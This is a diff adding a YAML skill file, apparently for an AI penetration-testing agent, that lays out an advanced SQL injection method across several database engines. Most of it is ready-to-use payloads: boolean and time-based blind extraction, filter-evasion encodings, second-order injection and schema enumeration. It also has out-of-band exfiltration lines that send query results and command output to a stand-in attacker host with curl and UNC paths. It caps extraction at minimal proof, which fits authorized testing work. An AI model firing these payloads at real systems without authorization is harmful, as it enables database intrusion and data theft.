@@ -1,0 +1,102 @@
+id: sqli-advanced
+name: "Advanced SQL Injection"
+description: "Blind, time-based, OOB, second-order, and WAF-bypass SQL injection techniques across MySQL, PostgreSQL, MSSQL, and SQLite."
+version: 1
+applicable_roles:
+  - attack
+  - audit
+tags:
+  - sqli
+  - blind-sqli
+  - time-based
+  - oob
+  - second-order
+  - waf-bypass
+  - database
+triggers:
+  - "SQL syntax"
+  - "mysql_fetch"
+  - "sqlite3?\\."
+  - "pg_query"
+  - "ORA-\\d{5}"
+  - "unclosed quotation mark"
+  - "UNION\\s+SELECT"
+  - "information_schema"
+  - "SLEEP\\("
+  - "pg_sleep"
+  - "BENCHMARK\\("
+  - "WAITFOR DELAY"
+  - "blind.*sql"
+  - "sql.*error"
+estimated_tokens: 850
+content: |
+  ## Advanced SQL Injection Methodology
+
+  ### Phase 1: Injection Point Discovery
+  - Test every parameter (GET, POST, headers, cookies, JSON keys) with canary payloads:
+    - String context: `' OR 'a'='a`, `" OR "a"="a`, `' AND '1'='2`
+    - Numeric context: `1 OR 1=1`, `1 AND 1=2`, `0 OR 1=1`
+    - Comment variants: `--`, `-- -`, `#`, `/**/`, `;%00`
+  - Compare response length/content between true and false conditions
+  - Check error messages — they leak the DB engine and query structure
+
+  ### Phase 2: DB Engine Fingerprinting
+  - MySQL: `SELECT @@version`, `SELECT version()`, error contains "MySQL"
+  - PostgreSQL: `SELECT version()`, error contains "pg_" or "PostgreSQL"
+  - MSSQL: `SELECT @@version`, error contains "Microsoft" or "ODBC"
+  - SQLite: `SELECT sqlite_version()`, error contains "SQLITE" or "no such column"
+  - Oracle: `SELECT banner FROM v$version`, error contains "ORA-"
+
+  ### Phase 3: Blind SQLi — Boolean-Based
+  When no output is visible but responses differ between true/false:
+  ```
+  ' AND 1=1-- -    → normal response (true)
+  ' AND 1=2-- -    → different response (false)
+  ```
+  Extract data one character at a time:
+  ```
+  ' AND SUBSTRING((SELECT current_user()),1,1)='a'-- -
+  ' AND ASCII(SUBSTRING((SELECT current_user()),1,1))>64-- -
+  ```
+  Binary search: bisect ASCII range 32-126 to extract each character in ~7 requests.
+
+  ### Phase 4: Blind SQLi — Time-Based
+  When boolean differences are not observable:
+  - MySQL: `' AND IF(1=1,SLEEP(3),0)-- -`
+  - MySQL heavy: `' AND BENCHMARK(5000000,MD5('x'))-- -`
+  - PostgreSQL: `'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -`
+  - MSSQL: `'; WAITFOR DELAY '0:0:3'-- -`
+  - SQLite: `' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 0 END)-- -`
+  Measure response time delta: 3s+ delay confirms execution.
+
+  ### Phase 5: Out-of-Band (OOB) Exfiltration
+  When time-based is unreliable or blocked:
+  - MySQL DNS exfil: `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',( SELECT current_user()),'.attacker.com\\\\a'))-- -`
+  - MySQL file write: `' UNION SELECT 'data' INTO OUTFILE '/tmp/proof.txt'-- -`
+  - PostgreSQL: `'; COPY (SELECT current_user()) TO PROGRAM 'curl http://ATTACKER/?d=$(whoami)'-- -`
+  - MSSQL xp_dirtree: `'; EXEC master..xp_dirtree '\\\\\\\\attacker.com\\\\a'-- -`
+
+  ### Phase 6: Second-Order SQLi
+  Payload stored now, triggered later in a different query:
+  1. Register/update a field with: `admin'-- -` as username
+  2. Trigger a password reset or profile lookup that uses the stored value
+  3. The stored payload executes in the second query context
+  Common sinks: username fields, address fields, search history, log entries
+
+  ### Phase 7: WAF Bypass Techniques
+  - Inline comments: `/*!50000UNION*/+/*!50000SELECT*/`
+  - Case variation: `uNiOn SeLeCt`
+  - Double URL encoding: `%2527` decodes to `%27` then to `'`
+  - Whitespace alternatives: `/**/`, `%09`, `%0a`, `%0d`, `+`
+  - Concatenation: `CONCAT(0x41,0x42)` instead of `'AB'`
+  - No-quotes numeric injection: `1 UNION SELECT 1,2,3`
+  - HTTP parameter pollution: `?id=1&id=' UNION SELECT 1-- -`
+  - JSON/XML body when form expected — different parser, different escaping
+
+  ### Phase 8: Data Extraction Strategy
+  Once injection confirmed, extract minimal non-sensitive proof:
+  1. `SELECT current_user()` — proves auth context
+  2. `SELECT table_name FROM information_schema.tables LIMIT 5` — proves data access
+  3. `SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 5`
+  4. Extract one non-sensitive row as proof of unauthorized data access
+  Do NOT dump entire databases — extract the minimum needed to prove impact.
